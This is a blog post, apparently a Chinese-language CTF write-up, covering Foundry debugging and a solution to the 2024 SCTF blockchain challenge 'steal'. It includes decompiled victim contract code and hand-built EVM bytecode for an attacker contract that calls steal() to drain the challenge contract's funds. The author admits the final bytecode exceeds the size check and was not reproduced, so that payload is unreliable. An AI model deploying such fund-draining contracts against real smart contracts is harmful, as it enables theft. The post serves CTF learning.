<!DOCTYPE html><html lang="en" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>comp - CTF_blockchain_summary | HeyGap's_Blog</title><meta name="author" content="HeyGap"><meta name="copyright" content="HeyGap"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="CTF 中的 blockchain 题目和常用工具的用法都放在这里面">
<meta property="og:type" content="article">
<meta property="og:title" content="comp - CTF_blockchain_summary">
<meta property="og:url" content="http://heygap.github.io/en/posts/34999.html">
<meta property="og:site_name" content="HeyGap&#39;s_Blog">
<meta property="og:description" content="CTF 中的 blockchain 题目和常用工具的用法都放在这里面">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="http://heygap.github.io/en/img/cover3.jpg">
<meta property="article:published_time" content="2024-10-02T04:19:00.000Z">
<meta property="article:modified_time" content="2025-02-12T10:09:13.125Z">
<meta property="article:author" content="HeyGap">
<meta property="article:tag" content="WriteUp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://heygap.github.io/en/img/cover3.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "comp - CTF_blockchain_summary",
  "url": "http://heygap.github.io/en/posts/34999.html",
  "image": "http://heygap.github.io/en/img/cover3.jpg",
  "datePublished": "2024-10-02T04:19:00.000Z",
  "dateModified": "2025-02-12T10:09:13.125Z",
  "author": [
    {
      "@type": "Person",
      "name": "HeyGap",
      "url": "http://heygap.github.io/en/"
    }
  ]
}</script><link rel="shortcut icon" href="/en/img/avatar.jpg"><link rel="canonical" href="http://heygap.github.io/en/posts/34999.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/en/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/en/',
  algolia: undefined,
  localSearch: {"path":"/en/search.xml","preload":true,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"No results found for: ${query}","hits_stats":"${hits} articles found"}},
  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"中"},
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: 'days',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'null',
  Snackbar: {"chs_to_cht":"You have switched to Traditional Chinese","cht_to_chs":"You have switched to Simplified Chinese","day_to_night":"You have switched to Dark Mode","night_to_day":"You have switched to Light Mode","bgLight":"#49b1f5","bgDark":"#1f1f1f","position":"bottom-left"},
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: true,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'comp - CTF_blockchain_summary',
  isHighlightShrink: true,
  isToc: true,
  pageType: 'post'
}</script><!-- hexo injector head_end start --><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiper.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://npm.elemecdn.com/hexo-butterfly-swiper/lib/swiperstyle.css" media="print" onload="this.media='all'"><!-- hexo injector head_end end --><meta name="generator" content="Hexo 6.3.0"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()
  window.addEventListener('load', preloader.endLoading)

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/en/img/background1.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/en/img/avatar.jpg" onerror="this.onerror=null;this.src='/en/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/en/archives/"><div class="headline">Articles</div><div class="length-num">31</div></a><a href="/en/tags/"><div class="headline">Tags</div><div class="length-num">24</div></a><a href="/en/categories/"><div class="headline">Categories</div><div class="length-num">11</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 我的文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> 小空调</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> 关于本人</span></a></div><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> articles</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> archives</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> categories</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> air-conditioner</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover3.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/en/"><span class="site-name">HeyGap's_Blog</span></a><a class="nav-page-title" href="/en/"><span class="site-name">comp - CTF_blockchain_summary</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> Search</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> 我的文章</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> 归档</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> 标签</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> 小空调</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> 关于本人</span></a></div><div class="menus_item"><a class="site-page" href="/en/"><i class="fa-fw fas fa-home"></i><span> home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> articles</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/en/archives/"><i class="fa-fw fa fa-archive"></i><span> archives</span></a></li><li><a class="site-page child" href="/en/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/en/categories/"><i class="fa-fw fa fa-folder-open"></i><span> categories</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/en/air-conditioner/"><i class="fa-fw anzhiyu-icon-fan"></i><span> air-conditioner</span></a></div><div class="menus_item"><a class="site-page" href="/en/about/"><i class="fa-fw fa fa-user"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">comp - CTF_blockchain_summary</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2024-10-02T04:19:00.000Z" title="Created 2024-10-02 12:10:00">2024-10-02</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-02-12T10:09:13.125Z" title="Updated 2025-02-12 18:02:12">2025-02-12</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/en/categories/competition/">competition</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">4.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>18mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><blockquote class="blockquote-center">
CTF 中的 blockchain 题目和常用工具的用法都放在这里面
</blockquote>

<span id="more"></span>
<h1 id="FF-常用工具"><a href="#FF-常用工具" class="headerlink" title="[FF] 常用工具"></a>[FF] 常用工具</h1><h2 id="FF-1-forge"><a href="#FF-1-forge" class="headerlink" title="[FF-1] forge"></a>[FF-1] forge</h2><h3 id="FF-1-1-动态调试"><a href="#FF-1-1-动态调试" class="headerlink" title="[FF-1-1] 动态调试"></a>[FF-1-1] 动态调试</h3><p>在安装好forge之后，使用forge init将项目环境初始化成 Foundry 的标准格式</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">project/</span><br><span class="line">├── src/             # Solidity 源代码文件</span><br><span class="line">├── test/            # 测试文件</span><br><span class="line">├── lib/             # 外部依赖（如 OpenZeppelin）</span><br><span class="line">└── foundry.toml     # 项目配置文件</span><br></pre></td></tr></table></figure>
<p>在 project/test 中创建文件 xxx.t.sol，在该文件中放入测试用例。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">// SPDX-License-Identifier: UNLICENSED</span><br><span class="line">pragma solidity ^0.8.26;</span><br><span class="line"></span><br><span class="line">import &#123;Test, console&#125; from &quot;forge-std/Test.sol&quot;;</span><br><span class="line">import &#123;Attack&#125; from &quot;../src/delegateCall/attack.sol&quot;;</span><br><span class="line">import &#123;DCallVictim&#125; from &quot;../src/delegateCall/DCall.sol&quot;;</span><br><span class="line"></span><br><span class="line">contract DCallTest is Test &#123;</span><br><span class="line">    Attack public attacker;</span><br><span class="line">    DCallVictim public victim;</span><br><span class="line"></span><br><span class="line">    function setUp() public &#123;</span><br><span class="line">        victim = new DCallVictim();</span><br><span class="line">        attacker = new Attack(address(victim));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function test_delegate() public &#123;</span><br><span class="line">        attacker.attack();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用下列命令即可调试测试用例。可以通过添加 -vvvv 来增加日志详细程度，也可以添加 —tc xxx.t.sol 来指定测试合约</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">forge test --debug &quot;test_delegate&quot;</span><br></pre></td></tr></table></figure>
<h1 id="0-2024-SCTF"><a href="#0-2024-SCTF" class="headerlink" title="[0] 2024 SCTF"></a>[0] 2024 SCTF</h1><h2 id="0-0-steal"><a href="#0-0-steal" class="headerlink" title="[0-0] steal"></a>[0-0] steal</h2><p>本题参考了 <a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/82/#steal">W&amp;M 的 wp</a></p>
<h3 id="0-0-0-analysis"><a href="#0-0-0-analysis" class="headerlink" title="[0-0-0] analysis"></a>[0-0-0] analysis</h3><p>这道题当时逆向没逆出来，赛后我才知道可以用gpt-o1反汇编yul核心代码（注意是核心代码，要不然体积太大不好翻译），没 gpt plus 的我只能调教 gpt-4o 了。喂给它的 prompt 是</p>
<p>你现在是一位yul-&gt;solidity的反汇编大师，你很擅长推理，请你帮我反汇编以下代码。另外，我有几点要求：</p>
<ol>
<li>不要重复我给你的Yul代码</li>
<li>如果有些代码需要明确用途，请你直接根据Yul给出对应的solidity代码即可，不能用注释忽略过去</li>
</ol>
<p>但是func_0x7f中间的一部分代码还是被忽略了，我框起那部分代码之后再让它<code>请你翻译出这部分的代码，我说过不要用注释</code>之后才得到下面的代码，去掉冗余函数，再稍微人工审计整理一下得到下面核心代码。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Contract &#123;</span><br><span class="line">    function isSolved() internal view returns (bool) &#123;</span><br><span class="line">        uint8 value = uint8(sload(0));</span><br><span class="line">        if (value != 0) &#123;</span><br><span class="line">            if (address(this).balance != 0) &#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function steal() internal &#123;</span><br><span class="line">        uint8 flag = uint8(sload(0));</span><br><span class="line">        require(flag == 0);</span><br><span class="line">        bool result = check_contract(msg.sender, 0x24a);</span><br><span class="line">        if (result) &#123;</span><br><span class="line">            (bool success, ) = msg.sender.call&#123;value: address(this).balance&#125;(&quot;&quot;);</span><br><span class="line">            require(success);</span><br><span class="line">            sstore(0, uint256(flag | 1));</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            revert(&quot;Unauthorized&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function check_contract(address _addr, uint256 _val) internal view returns (bool) &#123;</span><br><span class="line">        uint256 size;</span><br><span class="line">        assembly &#123;</span><br><span class="line">            size := extcodesize(_addr)</span><br><span class="line">        &#125;</span><br><span class="line">        if (size == 0 || size &gt; 0x40) &#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        bytes memory code = new bytes(size);</span><br><span class="line">        assembly &#123;</span><br><span class="line">            extcodecopy(_addr, add(code, 0x20), 0, size)</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        uint256 hashToCompare = 0x29df21df2a5f235f;</span><br><span class="line">        for (uint256 i = 0; i &lt; size; i++) &#123;</span><br><span class="line">            bytes32 chunkHash;</span><br><span class="line">            assembly &#123;</span><br><span class="line">                chunkHash := mload(add(code, add(0x20, i)))</span><br><span class="line">            &#125;</span><br><span class="line">            if (chunkHash == bytes32(hashToCompare)) &#123;</span><br><span class="line">                continue;</span><br><span class="line">            &#125;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>想要 isSolved 很简单，只需要成功调用 steal 函数中的 check_contract 函数，我们来看一下 check_contract 函数。</p>
<p>首先，check_contract 函数检查了调用者的合约代码字节数（如果是EOA字节数为0），这个调用者的合约数必须小于40并且不为0；因此作为攻击者，我们首先需要部署攻击合约(下称evil)。</p>
<p>其次，合约中必须存在0x29df21df2a5f235f这八个字节，要达成这个目的比较简单，只需要在编译好的合约bytecode之后附加这个八个字节即可。</p>
<p>在check_contract合约调用成功之后，steal函数会把自己的所有余额转给evil合约，所以evil合约还要实现fallback函数来接受转账。</p>
<h3 id="0-0-1-perform"><a href="#0-0-1-perform" class="headerlink" title="[0-0-1] perform"></a>[0-0-1] perform</h3><p>这种搓 mnemonic 的方式用 <a target="_blank" rel="noopener" href="https://www.evm.codes/playground">这个工具</a> 模拟起来比较方便</p>
<h4 id="0-0-1-0-initialization-code"><a href="#0-0-1-0-initialization-code" class="headerlink" title="[0-0-1-0] initialization code"></a>[0-0-1-0] initialization code</h4><p>首先我们需要知道部署合约的本质其实是发送一个没有to参数的tx</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">web3.eth.sendTransaction(&#123;</span><br><span class="line">    from: me</span><br><span class="line">    data: 0x......</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>而 data 由两部分组成，前面的部分是 initialization code，后面紧跟 runtime code</p>
<p>initialization code 主要做的就是将 runtime code 放入内存。我们需要用到<code>CODECOPY(t,f,s)</code>和<code>RETURN(p,s)</code>这两个 opcode，一个通用的模板如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x??    // (s: runtime code 字节数)</span><br><span class="line">PUSH1 0x??    // (f: initialization code 字节数)</span><br><span class="line">PUSH1 0x00    // (t: 拷贝到内存的t位置(此处为0x00))</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x??    // (s: 0x??)</span><br><span class="line">PUSH1 0x00    // (p: 0x00)</span><br><span class="line">RETURN        // (返回mem[p,(p+s)]的内容)</span><br></pre></td></tr></table></figure>
<h4 id="0-0-1-1-runtime-code"><a href="#0-0-1-1-runtime-code" class="headerlink" title="[0-0-1-1] runtime code"></a>[0-0-1-1] runtime code</h4><p>首先我们来处理 fallback，runtime code 都是自上而下执行的，我们需要用 jumpi 和 jumpdest 来实现 selector。</p>
<p>而 fallback 逻辑也很简单，只要调用者是 chall 合约直接 <code>stop</code> 就好，但是由于我们需要与 chall 合约地址进行比较，因此我们需要在 storage 里存入 chall 和 我们自己EOA的地址，所以需要修改 initialization code，在 storage[0] 存入我们自己，[1] 存入 chall_address</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">CALLER</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE        // sstore(0,caller()) 等价于 storage[0] = caller; </span><br><span class="line">PUSH20 chall_address</span><br><span class="line">PUSH1 0x00</span><br><span class="line">SSTORE        // storage[1] = chall_address </span><br><span class="line">PUSH1 0x??    // (s: runtime code 字节数)</span><br><span class="line">PUSH1 0x??    // (f: initialization code 字节数)</span><br><span class="line">PUSH1 0x00    // (t: 拷贝到内存的t位置(此处为0x00))</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x??    // (s: 0x??)</span><br><span class="line">PUSH1 0x00    // (p: 0x00)</span><br><span class="line">RETURN        // (返回mem[p,(p+s)]的内容)</span><br></pre></td></tr></table></figure>
<p>上面是修改后的 initialization code，下面是 runtime code 处理 fallback 的逻辑</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x00</span><br><span class="line">SLOAD</span><br><span class="line">CALLER</span><br><span class="line">EQ            // if caller == storage[0]，condition == 1</span><br><span class="line">PUSH1 0x??    // dest = 0x??</span><br><span class="line">JUMPI         // if condition == 1, jump to JUMPDEST</span><br><span class="line">STOP          // if condition == 0, execute this line</span><br><span class="line">              // 其实就是 fallback 的处理方法</span><br><span class="line">JUMPDEST      // 下面开始是 me 调用该合约时的处理方式</span><br></pre></td></tr></table></figure>
<p>接下来要调用 steal</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">PUSH1 0x00          // outsize</span><br><span class="line">PUSH1 0x00          // out</span><br><span class="line">PUSH1 0x04          // insize (mem[in...(in+size)]作为call的data)</span><br><span class="line">PUSH1 0x00          // in</span><br><span class="line">PUSH1 0x00          // v</span><br><span class="line">PUSH1 0x01          // 调用slot[1]的地址(chall)</span><br><span class="line">SLOAD               // 调用slot[1]的地址(chall)</span><br><span class="line">PUSH2 0xffff        // g</span><br><span class="line">PUSH4 0xcf7a8965    // bytes4(keccak256(&quot;steal()&quot;))</span><br><span class="line">PUSH1 0xe0          // 将0xcf7a8965左移至最高的4bytes</span><br><span class="line">SHL                 // 将0xcf7a8965左移至最高的4bytes</span><br><span class="line">PUSH1 0x00          // 将上一步得到的32bytes存入内存0号</span><br><span class="line">MSTORE</span><br><span class="line">CALL</span><br><span class="line">STOP</span><br></pre></td></tr></table></figure>
<p>把这几段代码拼起来，用上面那个网站转换mnemonic就可以得到bytecode了，但是有一些问题：首先是远程没有PUSH0，PUSH1 0x00 又会耗费很多字节，所以用SELFBALANCE来代替了PUSH1 0x00；其次是我们需要计算上面那些??代表的数值，最后得到的 bytecode 如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">CALLER</span><br><span class="line">SELFBALANCE</span><br><span class="line">SSTORE</span><br><span class="line">PUSH20 0x90b978154ee5bf119262a99be39a2f3a5ae81baf</span><br><span class="line">PUSH1 0x01</span><br><span class="line">SSTORE</span><br><span class="line">PUSH1 0x3f</span><br><span class="line">PUSH1 0x25</span><br><span class="line">SELFBALANCE</span><br><span class="line">CODECOPY</span><br><span class="line">PUSH1 0x3f</span><br><span class="line">SELFBALANCE</span><br><span class="line">RETURN</span><br><span class="line">SELFBALANCE</span><br><span class="line">SLOAD</span><br><span class="line">CALLER</span><br><span class="line">EQ</span><br><span class="line">PUSH1 0x08</span><br><span class="line">JUMPI</span><br><span class="line">STOP</span><br><span class="line">JUMPDEST</span><br><span class="line">SELFBALANCE</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH1 0x04</span><br><span class="line">SELFBALANCE</span><br><span class="line">SELFBALANCE</span><br><span class="line">PUSH1 0x01</span><br><span class="line">SLOAD</span><br><span class="line">PUSH2 0xffff</span><br><span class="line">PUSH4 0xcf7a8965</span><br><span class="line">PUSH1 0xe0</span><br><span class="line">SHL</span><br><span class="line">SELFBALANCE</span><br><span class="line">MSTORE</span><br><span class="line">CALL</span><br><span class="line">STOP</span><br></pre></td></tr></table></figure>
<p>转换之后得到<code>3347557390b978154ee5bf119262a99be39a2f3a5ae81baf600155603f60254739603f47f347543314600857005b47476004474760015461ffff63cf7a896560e01b4752f100</code>，再拼接上<code>29df21df2a5f235f</code>，直接发送给rpc_url即可</p>
<p>但是我检查了一下发现这个合约的codesize是大于0x40字节的，不知道为什么原作者可以通过，或许是我检查的范围过大了？forge本地也无法直接通过字节码来create，没办法复现了。</p>
